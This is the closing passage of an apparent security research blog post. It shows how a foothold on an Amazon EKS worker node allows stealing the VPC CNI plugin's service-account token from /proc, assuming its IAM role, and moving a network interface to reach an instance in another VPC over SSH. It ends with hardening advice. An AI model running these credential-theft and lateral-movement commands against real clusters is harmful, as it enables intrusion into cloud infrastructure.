AWS_ROLE_ARN=arn:aws:iam::123456789012:role/eksctl-bdawgs-irsa-cluster-addon-iamservicea-Role1-11MGRBEKHYG91 \
AWS_WEB_IDENTITY_TOKEN_FILE=<(sudo cat /proc/$(pidof aws-vpc-cni)/root/var/run/secrets/eks.amazonaws.com/serviceaccount/token) \
aws ec2 attach-network-interface --device-index 1 --instance-id i-0a497dbf67612ec22 --network-interface-id eni-0b0187f4302169cf8
```

```json
{
    'AttachmentId': 'eni-attach-039d3500cb2f52882'
}
```

And finally, we test that we can communicate via SSH:

```sql
[ec2-user@ip-192-168-57-155 ~]$ ssh ec2-user@3.105.189.248
The authenticity of host '3.105.189.248 (3.105.189.248)' can't be established.
ECDSA key fingerprint is SHA256:sk288UWLKGHqRaAqiCLF93m2MQpyZwkXTNgok+TC/IQ.
ECDSA key fingerprint is MD5:4c:26:b0:fa:ca:da:4b:bb:6b:34:7d:d8:5b:de:28:29.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '3.105.189.248' (ECDSA) to the list of known hosts.
```

As can be seen above, from a foothold in an EKS cluster, we’ve successfully moved an elastic network interface (ENI) from one EC2 instance (`crystal-palace`) to another (`Gibson`), to take advantage of the open Security Group associated with it, to gain network access to an EC2 instance that lives in a separate VPC.

## Conclusion

This post showed that by abusing the privileges of the Amazon VPC CNI plugin, it’s possible for workloads to manipulate the networking of other unrelated EC2 instances.This can be leveraged by an attacker with a foothold in an EKS cluster to access and attack other instances living in other VPCs.Whilst this blog post demonstrates accessing an instance via SSH, it’s possible this attack could be used against other internal services and applications/APIs to pivot laterally and further elevate privileges.Despite applying security best practices of hardening, if an attacker escapes the container and gains root on the worker node, they can easily steal the credentials from running pods and execute the attack.

For those securing EKS clusters, it’s important to be mindful to harden the cluster from container escapes, limit the scope of AWS IAM policies, and tighten security groups as tightly as possible to mitigate the risks of such attacks.
